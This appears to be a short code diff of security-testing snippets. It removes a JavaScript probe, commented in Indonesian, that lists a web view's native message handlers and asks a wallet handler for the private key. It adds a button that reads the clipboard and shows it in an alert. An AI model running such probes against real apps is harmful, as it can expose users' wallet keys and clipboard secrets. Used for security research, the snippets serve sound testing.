@@ -1,4 +1,1 @@
-alert(Object.keys(window.webkit.messageHandlers))
-// Harusnya cuma ada 1-2 handler. Kalau kamu bisa:
-window.webkit.messageHandlers.freighter.postMessage({action:"getPrivateKey"})
-// Dan dia balik private key = Critical
+<button onclick="navigator.clipboard.readText().then(t=>alert(t))">Paste</button>
